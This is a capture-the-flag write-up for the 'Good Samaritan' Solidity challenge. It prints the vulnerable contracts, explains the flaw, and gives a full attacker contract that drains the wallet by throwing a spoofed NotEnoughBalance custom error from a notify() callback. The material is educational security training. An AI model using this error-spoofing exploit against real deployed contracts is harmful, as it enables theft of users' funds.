# Good Samaritan

## Challenge Description

This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.

Would you be able to drain all the balance from his Wallet?

Things that might help:

-   [Solidity Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/)

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (
                keccak256(abi.encodeWithSignature("NotEnoughBalance()")) ==
                keccak256(err)
            ) {
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

## Challenge Solution Walkthrough

In this challenge, the goal is to drain all the funds from the `GoodSamaritan` contract. The contract initially holds 1,000,000 coins, with each withdrawal limited to 10 coins. Since it would take 10,000 transactions to withdraw all the coins individually, we need to find a way to drain the funds in a single contract interaction.

To understand the process, let's examine the `requestDonation()` function of the `GoodSamaritan` contract. This function initiates the donation request:

```solidity
function requestDonation() external returns (bool enoughBalance) {
    try wallet.donate10(msg.sender) {
        return true;
    } catch (bytes memory err) {
        if (
            keccak256(abi.encodeWithSignature("NotEnoughBalance()")) ==
            keccak256(err)
        ) {
            wallet.transferRemainder(msg.sender);
            return false;
        }
    }
}
```

When `requestDonation()` is called, it invokes the `donate10()` function of the `Wallet` contract. If the donation is successful, it transfers 10 coins. However, if the donation fails due to insufficient balance and reverts with the `"NotEnoughBalance()"` error message, it triggers the `transferRemainder()` function of the `Wallet` contract.

Let's explore the `donate10()` function:

```solidity
function donate10(address dest_) external onlyOwner {
    if (coin.balances(address(this)) < 10) {
        revert NotEnoughBalance();
    } else {
        coin.transfer(dest_, 10);
    }
}
```

In this function, the balance of the contract is checked. If it holds less than 10 coins, the function reverts with the `NotEnoughBalance()` error message. However, if the balance is sufficient, it transfers 10 coins using the `transfer()` function of the `Coin` contract.

Now, let's examine the `transfer()` function of the `Coin` contract:

```solidity
function transfer(address dest_, uint256 amount_) external {
    uint256 currentBalance = balances[msg.sender];

    if (amount_ <= currentBalance) {
        balances[msg.sender] -= amount_;
        balances[dest_] += amount_;

        if (dest_.isContract()) {
            INotifyable(dest_).notify(amount_);
        }
    } else {
        revert InsufficientBalance(currentBalance, amount_);
    }
}
```

This function retrieves the current balance of the sender's address. If the requested amount is less than or equal to the current balance, it subtracts the amount from the sender's balance and adds it to the `dest_` address. Additionally, if `dest_` is a contract, it calls the `notify()` function of the `dest_` contract to inform it about the sent amount. Importantly, the `dest_` address is the contract requesting the donation, while `msg.sender` represents the `Wallet` contract's address.

When the `notify()` function of the caller contract is executed, it has the ability to revert the transaction with the `"NotEnoughBalance()"` message. As a result, the `requestDonation()` function will execute the `transferRemainder()` function of the `Wallet` contract, transferring all the funds from the `Wallet` contract to the contract that requested the donation.

To solve this challenge, you need to implement and deploy the following contract, `GoodSamaritanSolution`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";

error NotEnoughBalance();

contract GoodSamaritanSolution {
    GoodSamaritan public goodSamaritan;

    constructor(address goodSamaritanAddress) {
        goodSamaritan = GoodSamaritan(goodSamaritanAddress);
    }

    function solveChallenge() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) revert NotEnoughBalance();
    }
}
```

When you call the `solveChallenge()` function of the `GoodSamaritanSolution` contract, it requests a donation using the `requestDonation()` function of the `GoodSamaritan` contract. The `requestDonation()` function then invokes the `donate10()` function of the `Wallet` contract, which, in turn, calls the `transfer()` function of the `Coin` contract. During the execution of `INotifyable(dest_).notify(amount_)`, the `notify()` function of the `GoodSamaritanSolution` contract will be called. Since the amount is set to 10, the transaction will revert with the `NotEnoughBalance()` message. Consequently, the `requestDonation()` function will execute the `transferRemainder()` function of the `Wallet` contract, transferring all the funds to the `GoodSamaritanSolution` contract.

## Challenge Description After Solving

Congratulations!

Custom errors in Solidity are identified by their 4-byte ‘selector’, the same as a function call. They are bubbled up through the call chain until they are caught by a catch statement in a try-catch block, as seen in the GoodSamaritan's `requestDonation()` function. For these reasons, it is not safe to assume that the error was thrown by the immediate target of the contract call (i.e., Wallet in this case). Any other contract further down in the call chain can declare the same error and throw it at an unexpected location, such as in the `notify(uint256 amount)` function in your attacker contract.
